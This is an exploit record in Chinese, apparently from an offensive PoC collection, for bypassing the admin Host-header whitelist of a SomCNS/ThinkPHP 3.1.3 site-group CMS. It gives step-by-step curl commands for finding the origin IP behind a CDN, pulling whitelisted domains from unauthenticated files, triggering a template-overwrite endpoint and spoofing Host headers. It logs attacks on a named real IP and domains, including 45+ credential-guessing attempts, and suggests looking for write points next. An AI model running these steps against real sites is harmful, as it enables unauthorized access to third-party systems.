# SomCNS/ThinkPHP3.1.3 站群：CommonAction 后台 Host 白名单为大小写敏感子串匹配（白名单域可零凭证获取，闸门可被任意前后缀承载绕过）

- **code**: somcns-thinkphp3.1.3-站群-从被-get_html1-覆盖的模板渲染里抠出后台-host-白名单-闸
- **kind**: exp
- **category**: auth-bypass
- **component**: SomCNS 站群 CMS（ThinkPHP 3.1.3）CommonAction 后台 Host 闸门
- **versions**: ThinkPHP 3.1.3（SomCNS 站群 CMS）
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-09 22:4x（UTC+8，task#648）本机 Windows curl.exe -k --noproxy '*' --resolve 直连源站 45.151.135.176:443，前置域名 thbac1dsua6v.gwtkx5hgk5.xyz：① 基线 Host=真实域名 GET /Admin/Index/login → 302/0B，Location:/，带 PHPSESSID（应用层闸门）；② Host=usertobbs.thb.mysqbbthisgoodsfor33333user.top → 200/919B，<title>后台登录</title>，含 name="username"、name="password"；③ Host=evil-<该白名单域> → 200/919B（子串命中）；④ Host 全大写 USERTUBBS.THB.MYSQBBTHISGOODSFOR33333USER.TOP → 302/0B（strpos 大小写敏感）；⑤ 带伪造 Cookie admin_user=admin; admin_id=... GET /Admin/Main/index → 302 → /Admin/Index/login，证明绕过仅到入口层、登录态校验完好；同期 45+ 组凭据 POST 登录全部失败。另：同一 IP 在 2026-10-29（前序 604/640，SNI thbac1dsua6v.csnsg36j8n.xyz）已有同结论，本次换域名在 task#648 上独立复测一致，故按同 code 合并而非新建。
- **path**: pocs/somcns-thinkphp3.1.3-站群-从被-get_html1-覆盖的模板渲染里抠出后台-host-白名单-闸/poc.md
- **tags**: thinkphp3.1.3,somcns,host白名单,认证绕过,子串匹配,strpos,源站直连,登录页暴露,大小写敏感
- **created_at**: 2026-10-28T19:00:37.910Z
- **engine**: https://thbac1dsua6v.gwtkx5hgk5.xyz / 源站 45.151.135.176:443（docroot /www/wwwroot/thisthbweb_com）
- **found_by**: exploit

## 描述

SomCNS/ThinkPHP 3.1.3 站群的后台闸门（Admin 组公共父类 CommonAction::_initialize）对 HTTP_HOST 做「大小写敏感的子串包含」判断：请求 Host 中出现白名单站群域名即放行，否则 /Admin/* 一律 302→/。白名单不必猜，可从目标自身零凭证可读的渲染产物/静态文件里提取。因此「抠白名单域 → 用其作 Host（或任意前后缀承载）→ 直连源站 IP」即可把 302/0B 的后台入口打开成 200 的真实登录页。该绕过只解第一层（入口可见），登录态校验仍完好；302 是应用层行为，边缘 CDN 按 Host 路由，必须在源站 IP 上打。

## 用法

```
1) 拿真实源站 IP：域名若在边缘/CDN 后，边缘按 Host 路由（未知 Host 返回 openresty 503/530），无法承载绕过；判据是同一路径在源站 IP 与边缘响应体逐字节一致（首页 md5 相同）。
2) 抠白名单字符串（零凭证）：GET /Upload/atop/jquery3_5.txt、/App/Tpl/Home/Index_index.html；若未烘焙先跑 /index.php?g=Home&m=Order&a=get_html1 把本站渲染覆盖进模板再读回，grep 'https?://([A-Za-z0-9.-]+)' 取反复出现、与站点品牌同名的分站域（形如 usertobbs.<品牌>.<随机>.top）。
3) 基线对照：Host=<真实域名> GET /Admin/Index/login → 302/0B Location:/，且带 Set-Cookie: PHPSESSID（⇒ 应用层 302，非 CDN）。
4) 过闸：Host=<白名单域> GET /Admin/Index/login → 200/919B，含 name="username"/name="password" 即成功。
5) 确证实现：Host="evil-<白名单域>" → 200；Host="<白名单域>.attacker.tld" → 200；Host 全大写变体 → 302 ⇒ 大小写敏感 strpos，非精确比对。
6) 登录页到手后做凭据复用/强度验证（POST /Admin/Index/login），但无效 Cookie 访问 /Admin/Main/index 仍 302→login，别把 200/919B 误判成已进后台。

命令（直连源站、绕本机代理、固定 SNI）：
curl -k -s --noproxy '*' -H 'Host: <白名单域>' -o /dev/null -w '%{http_code} %{size_download}\n' 'http://<源站IP>/Admin/Index/login'
curl -k -s --noproxy '*' --resolve '<真实域名>:443:<源站IP>' -H 'Host: <白名单域>' -o /dev/null -w '%{http_code} %{size_download}\n' 'https://<真实域名>/Admin/Index/login'
```

## 正文

```
# SomCNS / ThinkPHP 3.1.3 站群：CommonAction Host 白名单闸门绕过（后台登录页暴露）

## 一、原理与判据

- 后台 Admin 组所有控制器统一 `extends CommonAction`，`CommonAction::_initialize()` 用**大小写敏感的子串包含**（strpos 语义）比对 `HTTP_HOST`：
  - 未命中白名单 → `302 Moved Temporarily / Location: /`，`Content-Length: 0`
  - 命中 → 正常进入控制器，`/Admin/Index/login` 返回真实登录页（典型 919B）
- 因此**不是**"后台隐藏"，而是可被 Host 头打开的闸门；任意地址只要能承载白名单域名串作前缀/后缀都能放行（`evil-<白名单域>`、`<白名单域>.attacker.tld` 均可）。
- 302 的归属判定：响应带 `Set-Cookie: PHPSESSID=...` 与 PHP 缓存头 ⇒ 302 由 PHP 应用层发出，不是 CDN/前置规则。
- 白名单从目标自身零凭证可读内容里抠，不需要凭据强度验证：
  - `/Upload/atop/jquery3_5.txt`（静态直读）
  - `/App/Tpl/Home/Index_index.html`、`Index_indexapp.html`（模板渲染产物；若未烘焙，先跑 `Home/Order::get_html1` 覆盖再读回）
  - 取形如 `usertobbs.<品牌>.<随机>.top`（站群分站域名），反复出现即为配置域名。

## 二、前置条件

1. 能拿到**真实源站 IP**（域名通常在边缘/CDN 之后）。边缘按 Host 路由，未知 Host 直接 503/530，无法承载该绕过。
   - 同源判据：同一路径在源站 IP 与边缘上响应体逐字节相同（首页 md5 一致）。
2. 白名单域名可从目标自身渲染/静态文件读取（零凭证），或已知站群分站域名。
3. 源站 80/443 可达。

## 三、复现步骤

### Step 0 基线（证明闸门存在且是应用层）

```bash
curl -k -s --noproxy '*' -D - -o /dev/null \
  -H 'Host: <真实域名>' \
  'http://<源站IP>/Admin/Index/login'
# 期望: HTTP/1.1 302 Moved Temporarily
#       Set-Cookie: PHPSESSID=...
#       Location: /
#       Content-Length: 0
```

对 `/Admin/Index/index`、`/Admin/Article/indexam`、`/Admin/System/index` 同样 302/0B，说明是公共闸门而非单点。

### Step 1 抠白名单域名

```bash
# 可选：先让模板被渲染覆盖（零凭证）
curl -k -s --noproxy '*' -H 'Host: <真实域名>' \
  'http://<源站IP>/index.php?g=Home&m=Order&a=get_html1'

# 读渲染产物，提取域名
for p in /Upload/atop/jquery3_5.txt /App/Tpl/Home/Index_index.html; do
  curl -k -s --noproxy '*' -H 'Host: <真实域名>' "http://<源站IP>$p"
done | grep -oE 'https?://[A-Za-z0-9.-]+' | sort | uniq -c | sort -rn
# 取高频、与站点品牌同名的子域 = 白名单 Host
```

### Step 2 用白名单域作 Host 过闸

```bash
curl -k -s --noproxy '*' -D - \
  -H 'Host: <白名单域>' \
  'http://<源站IP>/Admin/Index/login' | head -40
# 期望: HTTP/1.1 200 OK
#       Content-Length: 919
#       <title>后台登录 - ...</title>
#       <form method="post"><input name="username" ...><input name="password" ...>
```

HTTPS 通道（固定 SNI，避免 DNS/代理干扰）：

```bash
curl -k -s --noproxy '*' --resolve '<真实域名>:443:<源站IP>' \
  -H 'Host: <白名单域>' \
  -o /dev/null -w '%{http_code} %{size_download}\n' \
  'https://<真实域名>/Admin/Index/login'
```

### Step 3 确证是子串 + 大小写敏感

| 变体 | 期望 |
|---|---|
| `Host: evil-<白名单域>` | 200（子串命中） |
| `Host: <白名单域>.attacker.tld` | 200（子串命中） |
| `Host: <白名单域大写变体>` | 302/0B（strpos 大小写敏感，非精确/非忽略大小写比对） |

### Step 4 登录页到手后的下一步

```bash
curl -k -s --noproxy '*' -D - \
  -H 'Host: <白名单域>' \
  -d 'username=admin&password=<PASS>' \
  'http://<源站IP>/Admin/Index/login'
# 失败: 302 Location: http://<源站IP>/Admin/Index/login（0B）
# 成功: 302 + Set-Cookie，随后带 Cookie GET /Admin/Index/index → 200
```

闸门绕过**只解第一层**（入口可见）。登录态校验完好：带无效 Cookie 访问业务页仍 302→login。不要把"200/919B"误判为"已进后台"。

## 四、失败时的常见原因

1. **在边缘 IP 上打**：openresty 边缘按 Host 路由，未知 Host 503/194B（或 530），且 `X-Forwarded-Host` / `X-Host` / `Forwarded` 覆盖头无效（仍 302）。必须直连源站 IP。
2. **Host 用了大写或拼错**：strpos 大小写敏感，一个字符大小写不对就 302。
3. **白名单域取错**：抓到的是外链/CDN 域名而非站群配置域（本站子域一般含品牌词且带随机后缀）。换 `/App/Tpl/Home/Index_index*.html` 再取。
4. **没做基线对照**：看到 302 就以为"后台不可达"，实际只是闸门；看到 200 就以为"进后台"，实际只是登录页。
5. **代理/DNS 干扰**：走系统代理或让域名解析到边缘，会得到边缘的 503/302，误判为失败。始终 `--noproxy '*'` + 直连 IP。
6. **拿登录页当突破口**：该站登录页无验证码无频控，但弱凭据验证不一定成立（本族站点数十组默认口令均失败），别把时间全压在凭据强度验证上；优先找同站更直接的非预期/写点。

## 五、适用范围

- SomCNS 署名、ThinkPHP 3.1.3、Admin 组全部 `extends CommonAction` 的站群安装（"菜单式精简版"）。
- 若目标存在 `extends Action` 的脱队控制器（如 Autoart/Wechat），优先走脱队路线，比绕 Host 闸门收益高。

## 六、验证记录

- 2026-11-09 22:4x（task#648）：源站 45.151.135.176:443，`--resolve` 固定 SNI。Host=真实域名 → 302/0B；Host=`usertobbs.thb.mysqbbthisgoodsfor33333user.top` → 200/919B 登录页；`evil-<白名单域>` → 200/919B；全大写 → 302/0B；伪造 Cookie 访问 `/Admin/Main/index` → 302→login（登录态完好，45+ 组凭据全失败）。
- 2026-10-29（前序 604/640）：同一 IP、SNI `thbac1dsua6v.csnsg36j8n.xyz`（docroot `/www/wwwroot/thisthbweb_com`）复现同结论，5 组弱凭据失败。

```
